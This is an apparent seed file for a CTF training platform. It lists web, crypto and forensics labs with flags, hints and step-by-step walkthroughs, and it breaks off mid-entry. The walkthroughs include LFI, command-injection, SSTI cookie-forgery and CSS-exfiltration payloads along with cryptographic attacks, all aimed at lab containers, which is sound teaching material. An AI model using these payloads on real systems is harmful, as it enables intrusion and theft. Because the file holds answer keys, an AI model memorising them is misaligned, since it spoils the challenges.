// ViperRange — Database Seed
// ZeroDay Security Services
//
// All 39 labs below are original ViperRange training environments.
// Every scenario, flag, and walkthrough was independently authored for
// this platform. Flags are stored as SHA-256 hashes — never plaintext.

const { PrismaClient } = require("@prisma/client");
const bcrypt = require("bcryptjs");
const crypto = require("crypto");

const prisma = new PrismaClient();

function hashFlag(flag) {
  return crypto.createHash("sha256").update(flag.trim()).digest("hex");
}





const LABS = [
  {
    slug: "file-oracle",
    name: "File Oracle",
    category: "WEB_APP",
    difficulty: "INTERMEDIATE",
    labType: "DEPLOYABLE",
    tags: ["LFI", "RCE", "Command Injection", "PHP"],
    description: `An internal diagnostics portal loads report modules by name with zero path validation. Chain a local file inclusion into a command-injection gate to retrieve the collector's output.`,
    points: 150,
    dockerImage: "zerodaysec/vr-file-oracle:latest",
    port: 80,
    estimatedDeployTime: 90,
    maxDuration: 5400,
    flag: "VR{oracle_lfi_chain_to_rce}",
    hints: [
      { order: 1, text: "The portal loads files via a `module` query parameter with no allow-list. What happens if you point it somewhere unexpected?", pointsPenalty: 10 },
      { order: 2, text: "robots.txt often reveals paths nobody wanted crawled. Check it.", pointsPenalty: 15 },
      { order: 3, text: "PHP's `php://filter` wrapper can base64-encode a file's source instead of executing it — useful for reading PHP files via an include-based LFI.", pointsPenalty: 20 },
    ],
    resources: [],
    isFeatured: true,
    walkthroughs: [
      {
        title: "Discovering the Inclusion Point",
        tool: "Browser",
        order: 1,
        content: `# Discovering the Inclusion Point

## Reconnaissance
Visit the lab's public URL. You'll land on \`index.php\`, which forwards to a \`diagnostics.php\` module via a \`module\` query parameter — for example \`/?module=diagnostics.php\`.

## Step 1 — Check robots.txt
\`\`\`
GET /robots.txt
\`\`\`
This discloses a path that was never meant to be requested directly: \`access.php\`.

## Step 2 — Confirm the inclusion vulnerability
Try:
\`\`\`
GET /?module=robots.txt
\`\`\`
If the raw contents of \`robots.txt\` render back to you as PHP output, the module loader is including files with no validation — a classic Local File Inclusion (LFI).`,
      },
      {
        title: "Reading Source with php://filter",
        tool: "curl",
        order: 2,
        content: `# Reading PHP Source via php://filter

Directly including a \`.php\` file executes it — you won't see its source, only its output. To read the *source code* instead, use PHP's \`php://filter\` stream wrapper with base64 encoding:

\`\`\`bash
curl "https://YOUR-LAB-URL/?module=php://filter/convert.base64-encode/resource=access.php"
\`\`\`

Decode the response:
\`\`\`bash
echo "<base64-output>" | base64 -d
\`\`\`

You'll recover the source of \`access.php\`, including the gate token used to unlock the diagnostics module.`,
      },
      {
        title: "Chaining to Command Injection",
        tool: "Browser",
        order: 3,
        content: `# From LFI to Command Injection

## Step 1 — Set the gate cookie
Using your browser's dev tools (Application → Cookies), set \`diag_token\` to the value you recovered from \`access.php\`.

## Step 2 — Reload the diagnostics module
\`\`\`
GET /?module=diagnostics.php
\`\`\`
You should now see a "Node Diagnostics" panel with a payload textarea.

## Step 3 — Break out of the shell command
The payload field is concatenated unescaped into a shell command. Submit:
\`\`\`
'; cat collector_output.log #
\`\`\`
This terminates the intended command early, runs your injected command, and comments out anything that follows. The flag is written to \`collector_output.log\` by the container's startup script — retrieve it and submit it on the lab page.`,
      },
    ],
  },
  {
    slug: "pixel-cache",
    name: "Pixel Cache",
    category: "WEB_APP",
    difficulty: "BEGINNER",
    labType: "DEPLOYABLE",
    tags: ["Information Disclosure", "Static Assets"],
    description: `An internal design-token relay serves a dynamically generated stylesheet. A leftover build-metadata comment never got stripped from production.`,
    points: 75,
    dockerImage: "zerodaysec/vr-pixel-cache:latest",
    port: 3000,
    estimatedDeployTime: 60,
    maxDuration: 3600,
    flag: "VR{css_comments_are_not_secrets}",
    hints: [
      { order: 1, text: "Not everything worth reading on a webpage is rendered visibly. Check the raw response of every linked asset.", pointsPenalty: 10 },
    ],
    resources: [],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Inspecting Generated Assets",
        tool: "Browser",
        order: 1,
        content: `# Inspecting Generated Assets

## Step 1 — Load the page
The landing page links a stylesheet at \`/assets/theme.css\`.

## Step 2 — View the raw CSS
\`\`\`
GET /assets/theme.css
\`\`\`
CSS comments (\`/* ... */\`) are never rendered by the browser — but they're plainly visible in the raw response. Scroll to the bottom of the file.

## Step 3 — Locate the flag
A \`build-meta\` comment was left in from an internal build pipeline. It contains the flag directly.`,
      },
    ],
  },
  {
    slug: "crawler-protocol",
    name: "Crawler Protocol",
    category: "WEB_APP",
    difficulty: "BEGINNER",
    labType: "DEPLOYABLE",
    tags: ["Information Disclosure", "robots.txt"],
    description: `An archive gateway publishes a crawler exclusion policy that assumes search engines are the only thing capable of requesting a URL.`,
    points: 75,
    dockerImage: "zerodaysec/vr-crawler-protocol:latest",
    port: 5000,
    estimatedDeployTime: 60,
    maxDuration: 3600,
    flag: "VR{robots_txt_is_a_suggestion}",
    hints: [
      { order: 1, text: "robots.txt tells well-behaved crawlers what NOT to index — it doesn't stop you from just visiting the URL yourself.", pointsPenalty: 10 },
    ],
    resources: [],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Reading the Exclusion Policy",
        tool: "curl",
        order: 1,
        content: `# Reading the Exclusion Policy

## Step 1 — Fetch robots.txt
\`\`\`bash
curl https://YOUR-LAB-URL/robots.txt
\`\`\`

## Step 2 — Visit the disallowed path
\`robots.txt\` is a voluntary convention respected by well-behaved crawlers — it enforces nothing. Visiting the disallowed path directly returns its contents:
\`\`\`bash
curl https://YOUR-LAB-URL/archive/internal/manifest
\`\`\`
The response is the flag.`,
      },
    ],
  },
  {
    slug: "session-architect",
    name: "Session Architect",
    category: "WEB_APP",
    difficulty: "BEGINNER",
    labType: "DEPLOYABLE",
    tags: ["Cookie Manipulation", "Base64", "Access Control"],
    description: `A tier-gated content portal decides access level from a client-supplied cookie. The cookie value is base64-encoded — which is not the same thing as encrypted.`,
    points: 75,
    dockerImage: "zerodaysec/vr-session-architect:latest",
    port: 3000,
    estimatedDeployTime: 60,
    maxDuration: 3600,
    flag: "VR{base64_is_not_encryption}",
    hints: [
      { order: 1, text: "Inspect your cookies in DevTools. What encoding produces text ending in `=` padding?", pointsPenalty: 10 },
      { order: 2, text: "Base64-decode your current cookie value. Once you see the plaintext pattern, you can guess and re-encode the value the server actually expects.", pointsPenalty: 15 },
    ],
    resources: [],
    isFeatured: true,
    walkthroughs: [
      {
        title: "Decoding and Forging the Session Cookie",
        tool: "Browser DevTools",
        order: 1,
        content: `# Decoding and Forging the Session Cookie

## Step 1 — Inspect the cookie
Open DevTools → Application → Cookies. You'll see a \`tier\` cookie with a base64-looking value (letters, digits, and \`=\` padding).

## Step 2 — Decode it
\`\`\`bash
echo "<cookie-value>" | base64 -d
# clearance-guest
\`\`\`
This confirms the "tier" is just base64, not encryption.

## Step 3 — Forge the privileged tier
The page hints that \`omega\` clearance is what unlocks the flag. Encode the expected value:
\`\`\`bash
echo -n "clearance-omega" | base64
\`\`\`

## Step 4 — Replace the cookie
Set the \`tier\` cookie to this new value and reload the page. The flag renders directly.`,
      },
    ],
  },
  {
    slug: "cipher-gate",
    name: "Cipher Gate",
    category: "WEB_APP",
    difficulty: "INTERMEDIATE",
    labType: "DEPLOYABLE",
    tags: ["JavaScript Obfuscation", "Client-Side Security"],
    description: `A maintenance console gates a diagnostic command behind a passphrase. The developer 'protected' the passphrase by obfuscating the client-side JavaScript check — forgetting that obfuscation isn't encryption.`,
    points: 120,
    dockerImage: "zerodaysec/vr-cipher-gate:latest",
    port: 3000,
    estimatedDeployTime: 75,
    maxDuration: 3600,
    flag: "VR{obfuscation_hides_not_protects}",
    hints: [
      { order: 1, text: "View the page source. The obfuscated script builds a string from hex-escaped array fragments and rotates the array before assembling it.", pointsPenalty: 15 },
      { order: 2, text: "You don't need to fully understand the obfuscation — just run it (or manually trace it) to see what string it assembles.", pointsPenalty: 15 },
    ],
    resources: [],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Deobfuscating the Client-Side Check",
        tool: "Browser DevTools",
        order: 1,
        content: `# Deobfuscating the Client-Side Check

## Step 1 — View source
Open the page source or DevTools → Sources. Locate the inline \`<script>\` block.

## Step 2 — Trace the obfuscation
The script defines a hex-escaped string array, rotates it by one position, then assembles four fragments in a specific index order inside \`__vrAssemble()\`.

## Step 3 — Reconstruct manually or via console
Paste the array and rotation logic into your browser console, or just decode each \`\\xNN\` hex-escaped fragment by hand:
- \`\\x37\` → \`7\`
- \`\\x76\\x52\\x32\\x78\` → \`vR2x\`
- \`\\x4c\\x6d\\x50\` → \`LmP\`
- \`\\x51\\x7a\\x39\\x21\` → \`Qz9!\`

Reassemble in the order the code specifies to get the real passphrase.

## Step 4 — Submit
Enter the recovered passphrase into the form. The server performs the real validation and returns the flag.`,
      },
    ],
  },
  {
    slug: "loose-types",
    name: "Loose Types",
    category: "WEB_APP",
    difficulty: "INTERMEDIATE",
    labType: "DEPLOYABLE",
    tags: ["PHP", "Variable Injection", "extract()"],
    description: `A feature-flag preview tool imports every query-string parameter directly into local PHP variable scope — including ones that were never meant to be user-controlled.`,
    points: 120,
    dockerImage: "zerodaysec/vr-loose-types:latest",
    port: 80,
    estimatedDeployTime: 75,
    maxDuration: 3600,
    flag: "VR{extract_overwrites_everything}",
    hints: [
      { order: 1, text: "Load the page with `?debug=1` to see application behavior instead of the raw source.", pointsPenalty: 10 },
      { order: 2, text: "PHP's `extract()` turns every key of an array into a same-named local variable. If your query string shares a name with an internal variable, you overwrite it.", pointsPenalty: 20 },
    ],
    resources: [],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Exploiting extract() Variable Overwrite",
        tool: "Browser",
        order: 1,
        content: `# Exploiting extract() Variable Overwrite

## Step 1 — View the source
Visiting the lab root without any parameters shows the PHP source itself (via \`highlight_file\`). Read it carefully — note the \`extract($_GET)\` call.

## Step 2 — Identify the gate variable
The source shows a \`$vaultUnlocked\` variable initialized to \`false\`, checked later to decide whether to include the vault module.

## Step 3 — Overwrite it
Because \`extract()\` imports every GET parameter as a local variable, you can simply set it directly:
\`\`\`
GET /?debug=1&vaultUnlocked=1
\`\`\`

## Step 4 — Retrieve the flag
The vault module renders and displays the flag.`,
      },
    ],
  },
  {
    slug: "template-engine",
    name: "Template Engine",
    category: "WEB_APP",
    difficulty: "ADVANCED",
    labType: "DEPLOYABLE",
    tags: ["SSTI", "Tornado", "Cookie Forgery"],
    description: `A survey preview widget splices a query parameter directly into raw Tornado template source before compilation — a textbook server-side template injection that also exposes the application's cookie-signing secret.`,
    points: 200,
    dockerImage: "zerodaysec/vr-template-engine:latest",
    port: 8888,
    estimatedDeployTime: 90,
    maxDuration: 5400,
    flag: "VR{ssti_forges_the_session}",
    hints: [
      { order: 1, text: "The `mode` parameter is inserted into the template *source*, not passed as a safely-escaped variable. Tornado templates use `{{ }}` for expressions.", pointsPenalty: 20 },
      { order: 2, text: "Tornado applications expose their settings dict via `application.settings`. What key holds the cookie secret?", pointsPenalty: 25 },
      { order: 3, text: "Once you know the cookie secret, you can sign your own `vault=open` cookie using Tornado's standard cookie-signing scheme.", pointsPenalty: 30 },
    ],
    resources: [],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Confirming the Injection Point",
        tool: "Browser",
        order: 1,
        content: `# Confirming the Injection Point

## Step 1 — Explore normal usage
The page offers a \`mode\` dropdown (calm / neutral / urgent) that previews rendered text.

## Step 2 — Test for injection
Try:
\`\`\`
GET /?mode={{7*7}}
\`\`\`
If \`49\` appears in the rendered preview area, the \`mode\` parameter is being evaluated as live template code before rendering — confirmed SSTI.`,
      },
      {
        title: "Leaking the Cookie Secret",
        tool: "Browser",
        order: 2,
        content: `# Leaking the Cookie Secret

## Step 1 — Enumerate available objects
The template context includes an \`application\` object (the Tornado \`Application\` instance). Try:
\`\`\`
GET /?mode={{ application.settings }}
\`\`\`

## Step 2 — Extract the cookie secret
Narrow down to the specific key:
\`\`\`
GET /?mode={{ application.settings["cookie_secret"] }}
\`\`\`
This renders the raw signing secret directly on the page.`,
      },
      {
        title: "Forging the Vault Cookie",
        tool: "Python",
        order: 3,
        content: `# Forging the Vault Cookie

Tornado signs secure cookies using HMAC over the cookie name, value, and a timestamp, versioned as \`signed cookie v2\`. With the leaked \`cookie_secret\`, you can reproduce a valid signature offline using the same construction Tornado itself uses (\`tornado.web.create_signed_value\`), for example inside a throwaway Python shell with \`tornado\` installed:

\`\`\`python
import tornado.web

secret = "<the secret you leaked>"
cookie = tornado.web.create_signed_value(secret, "vault", "open")
print(cookie.decode())
\`\`\`

Set this value as your \`vault\` cookie in the browser, then reload the page. The \`vault_status\` line now renders the flag instead of \`sealed\`.`,
      },
    ],
  },
  {
    slug: "style-injector",
    name: "Style Injector",
    category: "WEB_APP",
    difficulty: "ADVANCED",
    labType: "DEPLOYABLE",
    tags: ["CSS Injection", "Side-Channel Exfiltration"],
    description: `A theme preview widget splices a color parameter directly into an inline stylesheet with only angle-bracket stripping as sanitization — enough to break out of the CSS rule and inject attribute-selector exfiltration payloads against a hidden session field.`,
    points: 200,
    dockerImage: "zerodaysec/vr-style-injector:latest",
    port: 3000,
    estimatedDeployTime: 60,
    maxDuration: 3600,
    flag: "VR{css_selectors_leak_secrets}",
    hints: [
      { order: 1, text: "The `color` parameter lands inside a CSS rule body. What happens if your input contains a `}` character?", pointsPenalty: 15 },
      { order: 2, text: "CSS attribute selectors support prefix matching: `[value^=\"X\"]`. Combined with `background-image: url(...)`, a real browser fires a distinguishable network request only when the selector matches.", pointsPenalty: 25 },
      { order: 3, text: "The lab's `/simulate` page lets you submit many candidate selectors at once and reports the longest matching prefix — use it to binary-search the flag character by character.", pointsPenalty: 25 },
    ],
    resources: [],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Extracting the Flag via CSS Selectors",
        tool: "Browser",
        order: 1,
        content: `# Extracting the Flag via CSS Selectors

## Step 1 — Break out of the CSS rule
The \`color\` parameter is inserted directly into a \`.swatch { background-color: COLOR; }\` rule. Supplying:
\`\`\`
teal;} #secret[value^="V"]{background-image:url(x);
\`\`\`
closes the original rule early and opens a brand-new selector targeting the hidden \`#secret\` field.

## Step 2 — Understand the exfiltration primitive
In a real browser, \`background-image: url(...)\` only fires a network request if the selector actually matches an element on the page. Since \`#secret\`'s value is the flag, testing many prefixes tells you which one is correct — one character at a time.

## Step 3 — Use the render simulator
Visit \`/simulate\` and submit many candidate rules in one request, one per possible next character:
\`\`\`css
#secret[value^="VR{a"]{background-image:url(1);}
#secret[value^="VR{b"]{background-image:url(2);}
#secret[value^="VR{c"]{background-image:url(3);}
...
\`\`\`
The response reports the longest matching prefix among everything you submitted.

## Step 4 — Repeat and extend
Take the longest matched prefix, extend it by one more candidate character each round, and repeat until the closing \`}\` is matched. You've now reconstructed the entire flag using the same technique a real headless-browser CSS exfiltration attack would use.`,
      },
    ],
  },
  {
    slug: "narrow-key",
    name: "Narrow Key",
    category: "CRYPTO",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["RSA", "Wiener's Attack", "Continued Fractions"],
    description: `An RSA implementation was tuned for speed by picking an unusually small private exponent. Recover it using Wiener's continued-fraction approximation and decrypt the intercepted message.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{wieners_bound_broke_rsa}",
    hints: [
      { order: 1, text: "When e/n is close to k/d for small k and d, continued fractions of e/n will surface k/d as one of their convergents.", pointsPenalty: 20 },
      { order: 2, text: "A valid convergent must give an odd d and an integer φ(n) = (ed-1)/k.", pointsPenalty: 25 },
    ],
    resources: [
      { name: "narrow-key-params.txt", description: "Public modulus, exponent, and ciphertext", url: "/resources/narrow-key-params.txt" },
    ],
    isFeatured: true,
    walkthroughs: [
      {
        title: "Applying Wiener's Attack",
        tool: "Python",
        order: 1,
        content: `# Applying Wiener's Attack

## Background
Wiener's theorem states that if the private exponent \`d\` is smaller than roughly \`n^0.25\`, it can be recovered from the public key \`(n, e)\` alone using continued fraction expansion of \`e/n\`.

## Step 1 — Compute continued fraction convergents
\`\`\`python
def continued_fraction(num, den):
    cf = []
    while den:
        cf.append(num // den)
        num, den = den, num % den
    return cf

def convergents(cf):
    n0, d0, n1, d1 = 0, 1, 1, 0
    for a in cf:
        n0, n1 = n1, a * n1 + n0
        d0, d1 = d1, a * d1 + d0
        yield n1, d1
\`\`\`

## Step 2 — Test each convergent as a candidate (k, d)
For each \`(k, d)\` convergent of \`e/n\`:
1. Reject if \`k == 0\`.
2. Compute \`phi = (e*d - 1) // k\`. Reject if it doesn't divide evenly.
3. Recover candidate primes by solving \`x^2 - (n - phi + 1)x + n = 0\` and checking for integer roots.

## Step 3 — Decrypt
Once a valid \`d\` is found, decrypt the ciphertext with standard RSA: \`m = pow(c, d, n)\`, then convert the resulting integer to bytes and wrap it as the flag.`,
      },
    ],
  },
  {
    slug: "block-flip",
    name: "Block Flip",
    category: "CRYPTO",
    difficulty: "ADVANCED",
    labType: "OFFLINE",
    tags: ["AES-CBC", "Bit Flipping", "Malleability"],
    description: `An authentication scheme encrypts login credentials with AES-CBC. Because CBC mode has no built-in integrity check, flipping specific ciphertext bits produces a predictable, attacker-chosen change in the corresponding plaintext block.`,
    points: 180,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{cbc_bitflip_forges_identity}",
    hints: [
      { order: 1, text: "In CBC decryption, flipping a bit in ciphertext block N-1 flips the same bit position in the *decrypted* plaintext block N — and corrupts block N-1 itself.", pointsPenalty: 25 },
      { order: 2, text: "You know the current (wrong) plaintext character and the character you want. XOR those together, then XOR the result into the corresponding byte of the *previous* ciphertext block.", pointsPenalty: 25 },
    ],
    resources: [
      { name: "block-flip-transcript.txt", description: "Two ciphertext/IV pairs and the interactive prompt transcript", url: "/resources/block-flip-transcript.txt" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Executing the CBC Bit-Flip",
        tool: "Python",
        order: 1,
        content: `# Executing the CBC Bit-Flip

## Background
CBC decryption is: \`P[i] = Decrypt(C[i]) XOR C[i-1]\`. If you flip a bit in \`C[i-1]\`, the same bit position flips in \`P[i]\` after decryption — with no integrity check to catch it.

## Step 1 — Identify the target byte
Suppose block N currently decrypts to a placeholder character at a known offset, and you want it to decrypt to a specific target character instead.

## Step 2 — Compute the XOR patch
\`\`\`python
def patch_byte(ciphertext, block_index, byte_offset, current_char, target_char):
    ct = bytearray(ciphertext)
    prev_block_start = (block_index - 1) * 16
    xor_delta = ord(current_char) ^ ord(target_char)
    ct[prev_block_start + byte_offset] ^= xor_delta
    return bytes(ct)
\`\`\`

## Step 3 — Apply and resubmit
Send the modified ciphertext back to the service. The targeted byte in the affected plaintext block now decrypts to your chosen character, while the previous block becomes garbage (which is fine if it isn't checked).

## Step 4 — Repeat per required change
Apply this patch for every character you need to change, then submit the modified username/password ciphertext pair to unlock the flag.`,
      },
    ],
  },
  {
    slug: "rotor-maze",
    name: "Rotor Maze",
    category: "CRYPTO",
    difficulty: "BEGINNER",
    labType: "OFFLINE",
    tags: ["Enigma", "Classical Cryptography", "Brute Force"],
    description: `An intercepted transmission was encrypted on a partially-documented Enigma configuration. Some rotor settings are known; the rest must be recovered by systematic bruteforce.`,
    points: 100,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{enigma_rotors_bruteforced}",
    hints: [
      { order: 1, text: "An online Enigma simulator lets you fix the known settings and iterate the unknown rotor choice and reflector until the output reads as coherent text.", pointsPenalty: 15 },
    ],
    resources: [
      { name: "rotor-maze-intercept.txt", description: "Known machine model, reflector, plugboard pairs, and ciphertext", url: "/resources/rotor-maze-intercept.txt" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Reconstructing the Enigma Configuration",
        tool: "Manual Analysis",
        order: 1,
        content: `# Reconstructing the Enigma Configuration

## Step 1 — Load the known parameters
The intercept gives you the machine model, a partial rotor order, ring settings, and plugboard pairs. Enter these into any standards-compliant Enigma simulator.

## Step 2 — Bruteforce the missing rotor and reflector
With most settings fixed, only a small number of rotor/reflector combinations remain. Iterate through them, decrypting the ciphertext with each combination.

## Step 3 — Recognize the correct output
Only the correct configuration produces readable plaintext. The message reveals a flag with underscore-separated words — wrap it in the ViperRange flag format if the plaintext doesn't already include it.`,
      },
    ],
  },
  {
    slug: "masked-xor",
    name: "Masked XOR",
    category: "CRYPTO",
    difficulty: "BEGINNER",
    labType: "OFFLINE",
    tags: ["XOR Cipher", "Repeating Key", "Obfuscation"],
    description: `A short message was encrypted with a repeating-key XOR cipher, then padded with a decoy character inserted at a regular interval to throw off casual analysis.`,
    points: 100,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{xor_padding_stripped_clean}",
    hints: [
      { order: 1, text: "You know the plaintext should start with the flag prefix. XOR the first few known plaintext bytes against the first few ciphertext bytes to recover key bytes directly.", pointsPenalty: 15 },
      { order: 2, text: "Once you spot the decoy character repeating at a fixed interval, strip it before attempting the full XOR decryption.", pointsPenalty: 20 },
    ],
    resources: [
      { name: "masked-xor-ciphertext.txt", description: "Hex-encoded ciphertext and key length hint", url: "/resources/masked-xor-ciphertext.txt" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Stripping the Decoy and Recovering the Key",
        tool: "Python",
        order: 1,
        content: `# Stripping the Decoy and Recovering the Key

## Step 1 — Convert from hex
\`\`\`python
ciphertext = bytes.fromhex(open('masked-xor-ciphertext.txt').read().strip())
\`\`\`

## Step 2 — Identify and remove the decoy pattern
Inspect the byte sequence for a character that repeats at a suspiciously fixed interval — this is padding inserted purely to obscure the true ciphertext length and structure. Strip every occurrence at that interval.

## Step 3 — Recover the key via known-plaintext XOR
Because the flag format \`VR{\` is predictable, XOR those three known plaintext bytes against the corresponding ciphertext bytes to recover the first key bytes directly:
\`\`\`python
known_prefix = b"VR{"
key_fragment = bytes(c ^ p for c, p in zip(ciphertext, known_prefix))
\`\`\`

## Step 4 — Extend and decrypt
Once you've identified the repeating key (it may be short and readable once fully recovered), XOR the entire cleaned ciphertext against the repeating key to recover the full flag.`,
      },
    ],
  },
  {
    slug: "chinese-broadcast",
    name: "Chinese Broadcast",
    category: "CRYPTO",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["RSA", "Hastad's Attack", "CRT"],
    description: `The same short message was encrypted with a small public exponent under three different RSA moduli. Recovering the plaintext requires the Chinese Remainder Theorem and an integer cube root.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{hastad_broadcast_recovered}",
    hints: [
      { order: 1, text: "With the same message encrypted under 3 different moduli and exponent e=3, the Chinese Remainder Theorem combines the three congruences into one value modulo the product of the moduli.", pointsPenalty: 20 },
      { order: 2, text: "Because the message is much smaller than any single modulus, the CRT-combined value equals m^3 exactly (no modular wraparound) — so an integer cube root recovers m directly.", pointsPenalty: 25 },
    ],
    resources: [
      { name: "chinese-broadcast-params.txt", description: "Three (n, c) pairs sharing the same low exponent", url: "/resources/chinese-broadcast-params.txt" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Recovering the Message via Hastad's Broadcast Attack",
        tool: "Python",
        order: 1,
        content: `# Recovering the Message via Hastad's Broadcast Attack

## Background
When the same low-exponent-encrypted message is broadcast under multiple distinct moduli, the Chinese Remainder Theorem reconstructs \`m^e\` directly — without ever factoring any modulus.

## Step 1 — Solve the CRT system
\`\`\`python
from sympy.ntheory.modular import crt

n_list = [n1, n2, n3]
c_list = [c1, c2, c3]
combined, _ = crt(n_list, c_list)
\`\`\`

## Step 2 — Take the integer cube root
Since \`combined == m**3\` exactly (no modular reduction, because \`m\` is small relative to each \`n\`), recover \`m\` with an integer cube root:
\`\`\`python
def integer_cube_root(x):
    lo, hi = 0, 1 << ((x.bit_length() // 3) + 1)
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if mid**3 <= x:
            lo = mid
        else:
            hi = mid - 1
    return lo

m = integer_cube_root(combined)
\`\`\`

## Step 3 — Decode to bytes
\`\`\`python
flag_bytes = bytes.fromhex(hex(m)[2:])
print(flag_bytes.decode())
\`\`\``,
      },
    ],
  },
  {
    slug: "factor-hunt",
    name: "Factor Hunt",
    category: "CRYPTO",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["RSA", "Integer Factorization", "Weak Keys"],
    description: `An RSA modulus was generated with one prime factor far smaller than the other — small enough that a brute-force trial division recovers it in reasonable time.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{small_factor_breaks_modulus}",
    hints: [
      { order: 1, text: "Trial-divide the modulus by small primes upward. One factor is small enough to find this way; the other is n divided by it.", pointsPenalty: 20 },
    ],
    resources: [
      { name: "factor-hunt-key.txt", description: "Public modulus, exponent, and ciphertext", url: "/resources/factor-hunt-key.txt" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Factoring a Weak Modulus",
        tool: "Python",
        order: 1,
        content: `# Factoring a Weak Modulus

## Step 1 — Trial division
\`\`\`python
def find_small_factor(n, limit=10_000_000):
    d = 2
    while d < limit:
        if n % d == 0:
            return d
        d += 1
    return None

p = find_small_factor(n)
q = n // p
\`\`\`

## Step 2 — Reconstruct the private key
\`\`\`python
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
\`\`\`

## Step 3 — Decrypt
\`\`\`python
m = pow(c, d, n)
print(bytes.fromhex(hex(m)[2:]).decode())
\`\`\``,
      },
    ],
  },
  {
    slug: "hill-descent",
    name: "Hill Descent",
    category: "CRYPTO",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["Hill Cipher", "Linear Algebra", "Matrix Inversion"],
    description: `A message was encrypted with a Hill cipher using a known key matrix. Recovering the plaintext requires computing the modular inverse of that matrix under mod 26 arithmetic.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{matrix_inverse_mod_26}",
    hints: [
      { order: 1, text: "To decrypt a Hill cipher you need the inverse of the key matrix mod 26 — that requires the determinant's modular inverse and the adjugate matrix.", pointsPenalty: 20 },
    ],
    resources: [
      { name: "hill-descent-cipher.txt", description: "Key matrix and ciphertext", url: "/resources/hill-descent-cipher.txt" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Inverting the Key Matrix",
        tool: "Python",
        order: 1,
        content: `# Inverting the Key Matrix

## Step 1 — Compute the determinant mod 26
For an n×n key matrix, compute \`det(K) mod 26\`, then find its modular inverse mod 26 using the extended Euclidean algorithm (the determinant must be coprime with 26).

## Step 2 — Compute the adjugate matrix
The adjugate is the transpose of the cofactor matrix. Multiply every entry by the modular inverse of the determinant, then reduce mod 26 — this gives the inverse key matrix.

## Step 3 — Decrypt
Convert the ciphertext into numeric blocks matching the matrix dimension (A=0 ... Z=25), multiply each block by the inverse key matrix mod 26, and convert back to letters.

\`\`\`python
def decrypt_block(cipher_block, inv_key, size):
    result = [0] * size
    for i in range(size):
        for j in range(size):
            result[i] += inv_key[i][j] * cipher_block[j]
        result[i] %= 26
    return ''.join(chr(x + 97) for x in result)
\`\`\`

Run this across the full ciphertext in matrix-sized chunks to recover the flag.`,
      },
    ],
  },
  {
    slug: "stego-lock",
    name: "Stego Lock",
    category: "FORENSICS",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["Steganography", "steghide", "Password Cracking"],
    description: `An image conceals an encrypted archive using LSB steganography. The archive itself is passphrase-protected, and the passphrase was chosen from a common wordlist.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{steghide_wordlist_cracked}",
    hints: [
      { order: 1, text: "`steghide extract -sf <image>` will prompt for a passphrase — try an empty one first, some images use no password at all.", pointsPenalty: 15 },
      { order: 2, text: "If the archive itself is what's password-protected (not the steghide extraction), a wordlist attack with `john` or `fcrackzip` against the extracted archive is the next step.", pointsPenalty: 20 },
    ],
    resources: [
      { name: "vr-evidence-stego-lock.svg", description: "Evidence image containing a hidden steghide payload", url: "/labs/vr-evidence-stego-lock.svg" },
    ],
    isFeatured: true,
    walkthroughs: [
      {
        title: "Extracting and Cracking the Hidden Archive",
        tool: "Command Line",
        order: 1,
        content: `# Extracting and Cracking the Hidden Archive

## Step 1 — Attempt extraction with an empty passphrase
\`\`\`bash
steghide extract -sf evidence.jpg
\`\`\`
Press Enter at the passphrase prompt to try a blank password first.

## Step 2 — Inspect what you extracted
If successful, you'll have a password-protected archive. Check its metadata:
\`\`\`bash
zipnote extracted.zip
\`\`\`
Sometimes the zip comment itself hints at the wordlist to use.

## Step 3 — Crack the archive password
\`\`\`bash
zip2john extracted.zip > hash.txt
john --wordlist=rockyou.txt hash.txt
\`\`\`

## Step 4 — Open and retrieve the flag
Once cracked, unzip using the recovered password and read the flag from the contents.`,
      },
    ],
  },
  {
    slug: "binary-carve",
    name: "Binary Carve",
    category: "FORENSICS",
    difficulty: "BEGINNER",
    labType: "OFFLINE",
    tags: ["File Carving", "Signature Analysis", "binwalk"],
    description: `A single image file actually conceals a second file appended after its normal end-of-file marker — invisible to a typical image viewer but easily located by signature analysis.`,
    points: 100,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{signature_carving_reveals_all}",
    hints: [
      { order: 1, text: "`binwalk` scans a file for known magic-byte signatures at any offset, not just the start — perfect for finding data appended after a file's real end.", pointsPenalty: 15 },
    ],
    resources: [
      { name: "vr-evidence-binary-carve.svg", description: "Composite evidence file with an embedded archive", url: "/labs/vr-evidence-binary-carve.svg" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Carving the Embedded File",
        tool: "binwalk",
        order: 1,
